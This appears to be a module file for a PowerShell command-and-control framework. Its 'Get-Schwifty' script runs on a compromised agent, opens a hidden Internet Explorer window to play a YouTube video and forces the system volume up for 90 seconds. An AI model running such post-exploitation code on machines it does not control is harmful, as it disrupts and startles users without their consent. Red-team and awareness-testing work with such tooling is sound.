name: Get-Schwifty
authors:
  - name: ''
    handle: '@424f424f'
    link: https://twitter.com/424f424f
description: Launches a hidden browser session on the target system to play the "Get
  Schwifty" video from Rick and Morty at maximum volume, creating a disruptive and
  humorous audio-visual prank. This module leverages PowerShell to manipulate system
  volume settings and control a hidden Internet Explorer instance, ensuring the video
  plays loudly and unexpectedly. Operators can optionally specify a different YouTube
  video URL for custom pranks. The technique is intended for psychological operations,
  red team morale-boosting, or lighthearted demonstrations, and is non-destructive
  in nature. The sudden loud music and hidden playback can startle or amuse users,
  making it effective for attention-grabbing or stress-testing user awareness. No
  administrative privileges are required, and the prank is harmless, leaving no persistent
  changes on the system. Use responsibly and with consideration for the target audience.
software:
tactics: [TA0040]
techniques: [T1491.001]
background: true
output_extension:
needs_admin: false
opsec_safe: false
language: powershell
min_language_version: '2'
comments:
  - https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: VideoURL
    description: Other YouTube video URL to play instead of Get Schwifty.
    required: false
    value: ''
script: |
  Function Get-Schwifty
  {
      [CmdletBinding()]
      Param (
          [Parameter(Mandatory = $False, Position = 0)]
          [ValidateNotNullOrEmpty()]
          [String] $VideoURL = "https://www.youtube.com/watch?v=I1188GO4p1E"
      )

      Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
      Set-Speaker -Volume 50

      #Create hidden IE Com Object
      $IEComObject = New-Object -com "InternetExplorer.Application"
      $IEComObject.visible = $False
      $IEComObject.navigate($VideoURL)

      Start-Sleep -s 5

      $EndTime = (Get-Date).addseconds(90)

      # ghetto way to do this but it basically presses volume up to raise volume in a loop for 90 seconds
      do {
         $WscriptObject = New-Object -com wscript.shell
         $WscriptObject.SendKeys([char]175)
      }
      until ((Get-Date) -gt $EndTime)
  }
script_end: Get-Schwifty {{ PARAMS }}; 'Agent is getting schwifty!'
